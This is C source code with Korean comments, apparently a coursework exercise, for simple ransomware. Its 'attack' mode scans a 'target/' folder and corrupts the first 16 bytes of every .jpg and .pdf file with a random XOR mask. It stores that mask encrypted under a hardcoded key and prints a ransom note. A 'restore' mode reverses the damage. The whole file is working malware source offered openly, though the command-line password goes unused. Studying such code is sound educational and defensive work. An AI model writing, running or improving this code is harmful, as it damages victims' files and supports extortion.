#include <pthread.h>
#include <unistd.h> //fruncate 함수
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <dirent.h>
#include <libgen.h> //basename 함수
#include <openssl/rand.h> //RAND_bytes 함수
#include "crypto.h"
#include "utils.h"

#define NOTE_ATTACK "note_enc.txt"
#define NOTE_RESTORE "note_dec.txt"
#define BLOCK_SIZE 16 //블록 크기 정의
#define TARGET_DIR "target/" //디렉터리 정의

// 파일 암호화 함수 
void *attack(void *param) {
    char *file_path = (char *)param;  //파일 경로를 매개변수로 받음
    char *file_name = basename(file_path); //파일 경로에서 이름만 가져오기
    printf("[attack] %s\n", file_name); //암호화  대상 파일 이름 출력

    // 파일 열고 첫 16바이트 읽기
    FILE *file = fopen(file_path, "rb+"); //읽기, 쓰기모드 로 파일 열기
    if (!file) {
        perror("파일 열기 실패"); //파일 열기 실패했을 때 오류 메시지 출력
        pthread_exit(NULL);
    }
    
    //첫 16바이트 추출
    unsigned char plaintext[BLOCK_SIZE];
    fread(plaintext, 1, BLOCK_SIZE, file); //첫 16바이트 plaintext에 저장

    // 16바이트 랜덤 값 생성 (mask)
    unsigned char mask[BLOCK_SIZE];
    if (RAND_bytes(mask, BLOCK_SIZE) != 1) {
        perror("랜덤 값 생성 실패"); //랜덤 값 생성 실패했을 때 오류 메시지 출력
        fclose(file);
        pthread_exit(NULL);
    }

    // XOR 연산으로 암호문 생성
    unsigned char ciphertext[BLOCK_SIZE];
    for (int i = 0; i < BLOCK_SIZE; i++) {
        ciphertext[i] = plaintext[i] ^ mask[i]; //XOR연산
    }

    // 첫 16바이트 ciphertext로 overwrite
    fseek(file, 0, SEEK_SET); //파일 포인터를 맨 처음으로 이동
    fwrite(ciphertext, 1, BLOCK_SIZE, file); //암호문을 파일 첫 16바이트에 쓰기

    // "password"에서 16바이트 추출
    const char *password = "password";
    unsigned char key[BLOCK_SIZE];
    memset(key, 0, BLOCK_SIZE); // key를 0으로 초기화
    strncpy((char *)key, password, BLOCK_SIZE); // password를 key에 복사

    // mask를 key로 암호화
    unsigned char encrypted_mask[BLOCK_SIZE];
    aes_encrypt(key, mask, encrypted_mask); 

    // 파일 끝에 encrypted_mask 추가
    fseek(file, 0, SEEK_END); // 파일 포인터를 맨 끝으로 이동
    fwrite(encrypted_mask, 1, BLOCK_SIZE, file); //encrypted_mask를 파일 끝에  삽입

    fclose(file); //파일 닫기
    pthread_exit(NULL); //스레드 종료
}

// 파일 복호화 함수
void *restore(void *param) {
    char *file_path = (char *)param; //파일 경로를 매개변수로 받음
    char *file_name = basename(file_path); //파일 경로에서 이름만 가져오기
    printf("[restore] %s\n", file_name); //복호화  대상 파일 이름 출력

    // 파일 열기
    FILE *file = fopen(file_path, "rb+"); //읽기, 쓰기 모드로 파일 열기
    if (!file) {
        perror("파일 열기 실패");
        pthread_exit(NULL);
    }
    
    //첫 16바이트 추출
    unsigned char ciphertext[BLOCK_SIZE];
    fread(ciphertext, 1, BLOCK_SIZE, file); // 첫 16바이트 ciphertext에 저장

    // 마지막 16바이트 encrypted_mask추출
    fseek(file, -BLOCK_SIZE, SEEK_END); //파일 끝에서 BLOCK_SIZE만큼 뒤로 이동
    unsigned char encrypted_mask[BLOCK_SIZE];
    fread(encrypted_mask, 1, BLOCK_SIZE, file);//encryped_mask읽어오기

    // "password"에서 16바이트 추출
    const char *password = "password";
    unsigned char key[BLOCK_SIZE];
    memset(key, 0, BLOCK_SIZE); //key를 0으로 초기화
    strncpy((char *)key, password, BLOCK_SIZE); //password를 key에 복사, 부족하다면 0으로 패딩

    // encryped_mask를 mask로 복호화
    unsigned char decrypted_mask[BLOCK_SIZE];
    aes_decrypt(key, encrypted_mask, decrypted_mask);

    // XOR 연산으로 파일의 정상 16바이트 찾기
    unsigned char plaintext[BLOCK_SIZE];
    for (int i = 0; i < BLOCK_SIZE; i++) {
        plaintext[i] = ciphertext[i] ^ decrypted_mask[i]; //XOR연산
    }

    // 첫 16바이트 복원
    fseek(file, 0, SEEK_SET); //파일 포인터 맨 처음으로 이동
    fwrite(plaintext, 1, BLOCK_SIZE, file); //복원된 plaintext를 파일 맨 처음에 overwrite
    
    // 파일의 마지막 16바이트를 삭제해 원본 파일로 복원
    fclose(file);  // 파일 닫기

    // 파일 다시 열어서 파일 크기 조정
    file = fopen(file_path, "rb+");
    if (!file) {
        perror("파일 열기 실패");
        pthread_exit(NULL);
    }

    // 마지막 16바이트 삭제
    ftruncate(fileno(file), ftell(file) - BLOCK_SIZE); //파일 끝에서 마지막 16바이트 삭제
    
    
    fclose(file); //파일 닫기
    pthread_exit(NULL); //스레드 종료
}

int main(int argc, char *argv[]) {
    if (argc != 3) { //매개변수 잘 못 입력했을 때 사용법 출력
        fprintf(stderr, "사용법: %s <attack/restore> <password>\n", argv[0]);
        return 1;
    }
    
    //function pointer변수 f선언, 매개변수에 따라 함수를 f에 매핑
    void *(*f)(void *);
    if (strcmp(argv[1], "attack") == 0) {
        f = attack;
    } else if (strcmp(argv[1], "restore") == 0) {
        f = restore;
    } else {
        fprintf(stderr, "알 수 없는 모드: %s\n", argv[1]);
        return 1;
    }

    // 파일 타입별 카운트 변수
    int jpg_count = 0;
    int pdf_count = 0;

    // 디렉토리 내 파일들 처리
    DIR *dir = opendir(TARGET_DIR);
    if (!dir) {
        perror("디렉토리 열기 실패");
        return 1;
    }

    struct dirent *entry;
    while ((entry = readdir(dir)) != NULL) {
        // .jpg, .JPG파일들 처리
        if (strstr(entry->d_name, ".jpg") || strstr(entry->d_name, ".JPG")) {
            char file_path[256];
            snprintf(file_path, sizeof(file_path), "%s%s", TARGET_DIR, entry->d_name);
            pthread_t thread;
            pthread_create(&thread, NULL, f, (void *)file_path); // f에 매핑된 함수 pthread_create에 입력, 스레드 생성
            pthread_join(thread, NULL); //스레드 종료하기를 기다림
            jpg_count++; // jpg 파일 카운트 증가
        }
        if (strstr(entry->d_name, ".pdf")) { //.pdf파일 처리
            char file_path[256];
            snprintf(file_path, sizeof(file_path), "%s%s", TARGET_DIR, entry->d_name);
            pthread_t thread;
            pthread_create(&thread, NULL, f, (void *)file_path); //f에 매핑된 함수 pthread_create에 입력, 스레드 생성
            pthread_join(thread, NULL); //스레드 종료하기를 기다림
            pdf_count++; // pdf 파일 카운트 증가
        }
    }

    closedir(dir); //디렉터리 닫기

    // 암호화/복호화 후 파일 타입별 카운트 출력
    if (f == attack) {
        printf("[attack] %d jpg files were encrypted\n", jpg_count);
        printf("[attack] %d pdf files were encrypted\n", pdf_count);
        print_ransom_note(NOTE_ATTACK); //ransom note출력
    } else {
        printf("[restore] %d jpg files were decrypted\n", jpg_count);
        printf("[restore] %d pdf files were decrypted\n", pdf_count);
        print_ransom_note(NOTE_RESTORE); //ransom note출력
    }

    return 0;
}
